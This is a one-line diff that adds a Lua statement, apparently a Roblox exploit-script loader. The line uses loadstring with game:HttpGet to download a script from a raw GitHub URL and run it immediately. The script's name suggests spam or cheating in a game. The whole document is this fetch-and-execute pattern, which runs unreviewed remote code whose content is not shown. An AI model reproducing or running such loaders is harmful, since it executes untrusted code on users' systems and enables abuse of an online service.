@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/pt-2-build-the-pyramid-spam0-ytd4q33coexhww.lua"))()
